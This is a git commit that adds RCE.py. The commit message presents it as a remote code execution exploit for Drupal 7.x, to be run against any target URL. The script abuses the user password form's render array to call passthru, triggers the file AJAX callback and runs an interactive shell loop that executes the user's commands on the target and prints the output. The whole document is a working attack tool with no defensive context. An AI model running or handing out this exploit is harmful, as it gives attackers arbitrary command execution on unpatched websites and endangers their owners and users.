be3ca550864ee4723e382f919be93106732d0838
Armaan Pathan ( Lus3r ) <armaanpathan@gmail.com>
2018-04-24 15:25:26 +0530

    Add files via upload
    USE :- python RCE.py http://www.target.com 
    works for drupal 7.x

---
+++ RCE.py
@@ -0,0 +1,26 @@
+import requests
+import re
+from sys import argv
+
+domain = argv[1]
+
+
+def exploit(command):
+	HOST=domain
+
+	get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':command, 'name[#type]':'markup'}
+	post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
+	r = requests.post(HOST, data=post_params, params=get_params)
+
+	m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
+	if m:
+	    found = m.group(1)
+	    get_params = {'q':'file/ajax/name/#value/' + found}
+	    post_params = {'form_build_id':found}
+	    r = requests.post(HOST, data=post_params, params=get_params)
+	    print("\n".join(r.text.split("\n")[:-1]))
+
+
+while True:
+	command = raw_input('$ ')
+	exploit(command)
